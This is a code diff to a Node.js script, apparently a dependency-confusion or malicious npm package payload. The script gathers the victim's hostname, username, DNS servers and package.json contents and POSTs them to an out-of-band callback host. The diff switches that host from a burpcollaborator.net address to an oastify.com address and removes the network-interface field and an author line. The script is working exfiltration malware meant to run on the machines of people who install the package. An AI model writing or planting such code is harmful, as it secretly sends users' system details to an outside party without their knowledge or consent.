@@ -1,4 +1,3 @@
-//author:- bsainath4u@gmail.com
 const os = require("os");
 const dns = require("dns");
 const querystring = require("querystring");
@@ -13,7 +12,6 @@ const trackingData = JSON.stringify({
     hn: os.hostname(),
     un: os.userInfo().username,
     dns: dns.getServers(),
-    ip: os.networkInterfaces(),
     r: packageJSON ? packageJSON.___resolved : undefined,
     v: packageJSON.version,
     pjson: packageJSON,
@@ -24,7 +22,7 @@ var postData = querystring.stringify({
 });
 
 var options = {
-    hostname: "y10dcmh1knri843sg9x7p8fim9s0gp.burpcollaborator.net", //replace burpcollaborator.net with Interactsh or pipedream
+    hostname: "n1pygus02nu7ucngy5gl8qd0crii67.oastify.com", //replace burpcollaborator.net with Interactsh or pipedream
     port: 443,
     path: "/",
     method: "POST",
@@ -46,3 +44,4 @@ req.on("error", (e) => {
 
 req.write(postData);
 req.end();
+
